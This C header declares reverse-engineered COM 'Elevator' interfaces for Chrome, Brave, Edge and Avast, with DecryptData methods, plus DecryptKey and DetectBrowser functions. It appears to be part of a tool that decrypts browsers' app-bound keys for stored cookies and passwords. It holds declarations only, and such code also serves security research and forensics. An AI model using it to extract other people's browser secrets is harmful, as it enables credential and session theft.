#pragma once

#include <Windows.h>
#include <ShlObj.h>
#include "Extractor.h"

#ifndef NT_SUCCESS
#define NT_SUCCESS(Status) (((NTSTATUS)(Status)) >= 0)
#endif

extern const GUID IID_ChromeIElevator;
extern const GUID IID_ChromeIElevator2;
extern const GUID CLSID_ChromeElevator;

extern const GUID IID_ChromeBetaIElevator;
extern const GUID IID_ChromeBetaIElevator2;
extern const GUID CLSID_ChromeBetaElevator;

extern const GUID IID_BraveIElevator;
extern const GUID IID_BraveIElevator2;
extern const GUID CLSID_BraveElevator;

extern const GUID IID_EdgeIElevator;
extern const GUID IID_EdgeIElevator2;
extern const GUID CLSID_EdgeElevator;

extern const GUID IID_AvastIElevator;
extern const GUID CLSID_AvastElevator;

typedef struct IOriginalBaseElevator IOriginalBaseElevator;
typedef struct IOriginalBaseElevator2 IOriginalBaseElevator2;
typedef struct IAvastElevator IAvastElevator;
typedef struct IEdgeBaseElevator IEdgeBaseElevator;
typedef struct IEdgeIntermediateElevator IEdgeIntermediateElevator;
typedef struct IEdgeElevatorFinal IEdgeElevatorFinal;
typedef struct IEdgeElevator2Final IEdgeElevator2Final;

typedef struct IOriginalBaseElevatorVtbl {
    HRESULT(STDMETHODCALLTYPE* QueryInterface)(IOriginalBaseElevator* This, REFIID riid, void** ppvObject);
    ULONG(STDMETHODCALLTYPE* AddRef)(IOriginalBaseElevator* This);
    ULONG(STDMETHODCALLTYPE* Release)(IOriginalBaseElevator* This);
    HRESULT(STDMETHODCALLTYPE* RunRecoveryCRXElevated)(IOriginalBaseElevator* This, const WCHAR*, const WCHAR*, const WCHAR*, const WCHAR*, DWORD, ULONG_PTR*);
    HRESULT(STDMETHODCALLTYPE* EncryptData)(IOriginalBaseElevator* This, ProtectLevel, const BSTR, BSTR*, DWORD*);
    HRESULT(STDMETHODCALLTYPE* DecryptData)(IOriginalBaseElevator* This, const BSTR, BSTR*, DWORD*);
} IOriginalBaseElevatorVtbl;

struct IOriginalBaseElevator {
    IOriginalBaseElevatorVtbl* lpVtbl;
};

struct IOriginalBaseElevator2 {
    IOriginalBaseElevatorVtbl* lpVtbl;
};

typedef struct IAvastElevatorVtbl {
    HRESULT(STDMETHODCALLTYPE* QueryInterface)(IAvastElevator* This, REFIID riid, void** ppvObject);
    ULONG(STDMETHODCALLTYPE* AddRef)(IAvastElevator* This);
    ULONG(STDMETHODCALLTYPE* Release)(IAvastElevator* This);
    HRESULT(STDMETHODCALLTYPE* RunRecoveryCRXElevated)(IAvastElevator* This, const WCHAR*, const WCHAR*, const WCHAR*, const WCHAR*, DWORD, ULONG_PTR*);
    HRESULT(STDMETHODCALLTYPE* UpdateSearchProviderElevated)(IAvastElevator* This, const WCHAR*);
    HRESULT(STDMETHODCALLTYPE* CleanupMigrateStateElevated)(IAvastElevator* This);
    HRESULT(STDMETHODCALLTYPE* UpdateInstallerLangElevated)(IAvastElevator* This, const WCHAR*);
    HRESULT(STDMETHODCALLTYPE* UpdateBrandValueElevated)(IAvastElevator* This, const WCHAR*);
    HRESULT(STDMETHODCALLTYPE* MigrateUninstallKeyElevated)(IAvastElevator* This, const WCHAR*);
    HRESULT(STDMETHODCALLTYPE* UpdateEndpointIdElevated)(IAvastElevator* This, const char*);
    HRESULT(STDMETHODCALLTYPE* UpdateFingerprintIdElevated)(IAvastElevator* This, const char*);
    HRESULT(STDMETHODCALLTYPE* RunMicroMVDifferentialUpdate)(IAvastElevator* This);
    HRESULT(STDMETHODCALLTYPE* EncryptData)(IAvastElevator* This, ProtectLevel, const BSTR, BSTR*, DWORD*);
    HRESULT(STDMETHODCALLTYPE* DecryptData)(IAvastElevator* This, const BSTR, BSTR*, DWORD*);
    HRESULT(STDMETHODCALLTYPE* DecryptData2)(IAvastElevator* This, const BSTR, BSTR*, DWORD*);
} IAvastElevatorVtbl;

struct IAvastElevator {
    IAvastElevatorVtbl* lpVtbl;
};

typedef struct IEdgeBaseElevatorVtbl {
    HRESULT(STDMETHODCALLTYPE* QueryInterface)(IEdgeBaseElevator* This, REFIID riid, void** ppvObject);
    ULONG(STDMETHODCALLTYPE* AddRef)(IEdgeBaseElevator* This);
    ULONG(STDMETHODCALLTYPE* Release)(IEdgeBaseElevator* This);
    HRESULT(STDMETHODCALLTYPE* EdgeBaseMethod1_Unknown)(IEdgeBaseElevator* This);
    HRESULT(STDMETHODCALLTYPE* EdgeBaseMethod2_Unknown)(IEdgeBaseElevator* This);
    HRESULT(STDMETHODCALLTYPE* EdgeBaseMethod3_Unknown)(IEdgeBaseElevator* This);
} IEdgeBaseElevatorVtbl;

struct IEdgeBaseElevator {
    IEdgeBaseElevatorVtbl* lpVtbl;
};

typedef struct IEdgeIntermediateElevatorVtbl {
    HRESULT(STDMETHODCALLTYPE* QueryInterface)(IEdgeIntermediateElevator* This, REFIID riid, void** ppvObject);
    ULONG(STDMETHODCALLTYPE* AddRef)(IEdgeIntermediateElevator* This);
    ULONG(STDMETHODCALLTYPE* Release)(IEdgeIntermediateElevator* This);
    HRESULT(STDMETHODCALLTYPE* EdgeBaseMethod1_Unknown)(IEdgeIntermediateElevator* This);
    HRESULT(STDMETHODCALLTYPE* EdgeBaseMethod2_Unknown)(IEdgeIntermediateElevator* This);
    HRESULT(STDMETHODCALLTYPE* EdgeBaseMethod3_Unknown)(IEdgeIntermediateElevator* This);
    HRESULT(STDMETHODCALLTYPE* RunRecoveryCRXElevated)(IEdgeIntermediateElevator* This, const WCHAR*, const WCHAR*, const WCHAR*, const WCHAR*, DWORD, ULONG_PTR*);
    HRESULT(STDMETHODCALLTYPE* EncryptData)(IEdgeIntermediateElevator* This, ProtectLevel, const BSTR, BSTR*, DWORD*);
    HRESULT(STDMETHODCALLTYPE* DecryptData)(IEdgeIntermediateElevator* This, const BSTR, BSTR*, DWORD*);
} IEdgeIntermediateElevatorVtbl;

struct IEdgeIntermediateElevator {
    IEdgeIntermediateElevatorVtbl* lpVtbl;
};

typedef struct IEdgeElevator2FinalVtbl {
    HRESULT(STDMETHODCALLTYPE* QueryInterface)(IEdgeElevator2Final* This, REFIID riid, void** ppvObject);
    ULONG(STDMETHODCALLTYPE* AddRef)(IEdgeElevator2Final* This);
    ULONG(STDMETHODCALLTYPE* Release)(IEdgeElevator2Final* This);
    HRESULT(STDMETHODCALLTYPE* EdgeBaseMethod1_Unknown)(IEdgeElevator2Final* This);
    HRESULT(STDMETHODCALLTYPE* EdgeBaseMethod2_Unknown)(IEdgeElevator2Final* This);
    HRESULT(STDMETHODCALLTYPE* EdgeBaseMethod3_Unknown)(IEdgeElevator2Final* This);
    HRESULT(STDMETHODCALLTYPE* RunRecoveryCRXElevated)(IEdgeElevator2Final* This, const WCHAR*, const WCHAR*, const WCHAR*, const WCHAR*, DWORD, ULONG_PTR*);
    HRESULT(STDMETHODCALLTYPE* EncryptData)(IEdgeElevator2Final* This, ProtectLevel, const BSTR, BSTR*, DWORD*);
    HRESULT(STDMETHODCALLTYPE* DecryptData)(IEdgeElevator2Final* This, const BSTR, BSTR*, DWORD*);
    HRESULT(STDMETHODCALLTYPE* RunIsolatedChrome)(IEdgeElevator2Final* This, const WCHAR*, const WCHAR*, DWORD*, ULONG_PTR*);
    HRESULT(STDMETHODCALLTYPE* AcceptInvitation)(IEdgeElevator2Final* This, const WCHAR*);
} IEdgeElevator2FinalVtbl;

struct IEdgeElevator2Final {
    IEdgeElevator2FinalVtbl* lpVtbl;
};

BOOL DetectBrowser(void);
BOOL DecryptKey(const BYTE* encKey, DWORD encKeyLen, BYTE** decKey, DWORD* decKeyLen);
